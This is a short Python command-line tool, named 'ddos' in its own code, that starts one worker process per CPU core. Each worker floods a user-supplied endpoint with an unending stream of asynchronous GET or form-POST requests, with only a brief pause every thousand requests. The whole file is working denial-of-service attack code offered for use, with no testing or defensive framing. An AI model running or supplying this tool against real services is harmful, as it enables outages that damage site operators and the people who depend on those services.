import click
import multiprocessing
import asyncio
from httpx import AsyncClient
from urllib.parse import urlencode


@click.command('ddos')
@click.option('-w', '--workers', type=click.INT, default=multiprocessing.cpu_count(),
              help='Number of workers sending requests')
@click.option('-W', '--wait-step', type=click.INT, default=1000, help='Wait step in task stream')
@click.option('-d', '--data', multiple=True, help='Data in form-data format to send, If request is GET is ignored')
@click.option('-m', '--method', default='GET', help='Request Method')
@click.argument('endpoint', required=True)
def main(workers, method, endpoint, data, wait_step):
    data = dict([entry.split('=') for entry in data])
    threads = [multiprocessing.Process(target=fork_worker, args=(method, endpoint, data, wait_step)) for _ in range(workers)]

    try:
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        for thread in threads:
            thread.kill()


def fork_worker(method, endpoint, data, wait_step):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(task_stream(method, endpoint, data, loop, wait_step))
    loop.run_forever()


async def task_stream(method, endpoint, data, loop, wait_step):
    print(f'Starting {multiprocessing.current_process().pid}')
    async with AsyncClient() as http_client:
        if method == 'GET':
            callback = lambda: http_client.get(endpoint)
        else:
            _data = urlencode(data).encode()
            headers = {'Content-Type': 'application/x-www-form'}
            callback = lambda: http_client.request(method, endpoint, headers=headers, content=_data)
        i = 0
        while True:
            if i == wait_step:
                await asyncio.sleep(0.05)
                i = -1
            loop.create_task(make_request(callback))
            i += 1


async def make_request(fx):
    print('Request', multiprocessing.current_process().pid)
    try:
        await fx()
    except Exception as err:
        print('Error', multiprocessing.current_process().pid, err)


if __name__ == '__main__':
    main()
